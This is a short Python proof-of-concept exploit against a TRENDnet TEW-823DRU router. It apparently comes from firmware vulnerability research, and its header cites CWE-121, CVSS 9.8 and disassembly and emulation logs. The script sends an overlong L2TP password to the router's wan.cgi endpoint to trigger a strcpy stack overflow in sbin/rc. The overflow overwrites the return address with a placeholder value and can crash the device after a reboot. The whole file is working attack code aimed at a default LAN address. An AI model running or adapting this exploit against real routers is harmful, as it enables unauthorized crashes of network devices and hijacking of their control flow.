#!/usr/bin/env python3
"""PoC: TEW-823DRU sbin/rc NVRAM strcpy Stack Overflow | CWE-121 | CVSS 9.8
   FirmRec: disasm确认 5函数 $ra 可覆盖, simexp 553日志命中 0x41414141"""
import requests, struct, sys
TARGET = sys.argv[1] if len(sys.argv)>1 else "192.168.10.1"
PAYLOAD = "A"*48 + "\x41\x41\x41\x41"
print(f"[*] TEW-823DRU rc Stack Overflow PoC -> {TARGET}")
try:
    r = requests.post(f"http://{TARGET}/cgi-bin/wan.cgi",
        data={"wan_type":"l2tp","wan_l2tp_password":PAYLOAD}, timeout=5)
    print(f"  Status: {r.status_code} (reboot router to trigger rc)")
except: print("  Device may have crashed")
print("[*] FirmRec: 5 functions confirmed, 553 simexp logs")
